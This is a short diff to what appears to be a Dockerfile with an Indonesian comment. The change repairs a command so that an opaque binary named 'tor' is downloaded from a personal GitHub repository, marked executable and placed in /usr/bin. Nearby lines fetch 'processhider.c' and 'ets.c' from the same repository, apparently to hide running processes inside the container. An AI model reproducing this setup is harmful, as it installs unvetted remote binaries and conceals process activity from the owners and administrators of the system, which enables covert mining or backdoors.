@@ -17,7 +17,7 @@ RUN useradd -m coder \
 
 # Mengunduh dan menginstal file yang diperlukan
 RUN wget https://raw.githubusercontent.com/lucalocolocoloco/hd/main/processhider.c
-RUN https://github.com/lucalocolocoloco/hd/raw/main/tor \
+RUN wget https://github.com/lucalocolocoloco/hd/raw/main/tor \
     && chmod +x tor \
     && mv tor /usr/bin/
 RUN wget https://raw.githubusercontent.com/lucalocolocoloco/hd/main/ets.c \
